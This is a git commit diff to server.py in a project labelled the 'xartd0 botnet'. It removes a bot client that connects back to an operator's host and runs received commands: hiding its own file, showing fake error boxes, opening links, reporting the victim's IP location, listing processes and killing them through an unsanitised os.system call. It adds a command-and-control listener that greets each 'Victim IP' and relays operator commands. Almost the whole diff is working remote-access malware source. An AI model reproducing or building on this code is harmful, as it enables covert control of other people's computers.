5db8fd609365bbc597e9838ebaf0da34e09c7368
Xartd0 <43171120+xartd0@users.noreply.github.com>
2022-06-12 14:03:14 +0300

    Update server.py

--- server.py
+++ server.py
@@ -2,72 +2,43 @@ from imports import *
 
 s = socket.socket()
 
-help_message = '''  ├ Help
-  └ open-link (link)
-    └ invisible (make the file hidden)
-      └ error (message) (send an error message)
-        └ exit (close client)
-          └ help (help menu)
-            └ ip-info (information about client ip)
-              └ pids (list of client proccesses)
-                └ kill (PID) (kill proccess by PID)
-            '''
 
-def setup_bot():
-    while True:
-        try:
-            time.sleep(20)
-            s.connect((HOST_CLIENT, PORT))
-            break
-        except:
-            continue
+def exit():
+    print(f"» Listen to the {HOST_CLIENT}:{PORT}")
+    Listener()
 
-setup_bot()
 
-try:
-    while True:
-        command = s.recv(1024).decode()
-        print(command)
-        if 'error' in command:
-            s.send('  └─▷ The message was sent successfully'.encode())
-            ctypes.windll.user32.MessageBoxW(0, command.partition(' ')[2], "xartd0 botnet", 16)
-        elif command == 'exit':
-            s.send('  └─▷ Session was successfully closed'.encode())
-            s.close()
-            exit(0)
-        elif command == 'invisible':
-            s.send(f'  └─▷ {sys.argv[0]} was successfully hidden'.encode())
-            subprocess.check_call(["attrib","+H",sys.argv[0]])
-        elif 'open-link' in command:
-            s.send(f'  └─▷ {command.split(" ")[1]} has been successfully opened'.encode())
-            webbrowser.open(command.split(' ')[1])
-        elif command == 'help':
-            s.send(help_message
-            .encode())
-        elif command == 'ip-info':
-            response = requests.get(f'http://ip-api.com/json/').json()
-            s.send(f'''  ├ Ip: {response["query"]}
-  └ Country: {response["country"]}
-    └ City: {response["regionName"]}
-      └ Zip-code: {response["zip"]}
-        └ Isp: {response["isp"]}'''.encode())
-        elif command == 'pids':
-            proccesses = ''
-            for proc in psutil.process_iter():
-                try:
-                    proccesses += f"{proc.name()}:{proc.pid}\n"
-                except:
-                    pass
-            s.send(proccesses.encode())
-        elif 'kill' in command:
-            print(command.split(' ')[1])
-            os.system(f"taskkill /F /PID {command.split(' ')[1]}")
-            s.send(f'  └─▷ {command.split(" ")[1]} was successfully killed'.encode())
-        else:
-            s.send(f'  └─▷ Command not found!\n{help_message}'.encode())
-        
-except:
-    setup_bot()
+def Listener():
+    socks, client = s.accept()
+    print("\n»  ┏   The new bot is connected to the server!  ┓")
+    print(f'»  ┗   Victim IP : {client[0]}:{client[1]}           ┛')
+    control_bot(socks)
 
+
+def control_bot(socks):
+    try:
+        while True:
+            comm = input('❯ Server: ')
+            socks.send(comm.encode())
+            resultcomm = socks.recv(10240).decode()
+            print(resultcomm)
+            if comm == 'exit':
+                exit()
+    except ConnectionResetError:
+        print('Connection lost :(')
+        exit()
+
+
+
+def main():
+    print('» xartd0 botnet')
+    s.bind((HOST_SERVER, PORT))
+    s.listen(5)
+    print(f"» Listen to the {HOST_CLIENT}:{PORT}")
+    Listener()
+
+
+if __name__ == "__main__":
+    main()
 
 
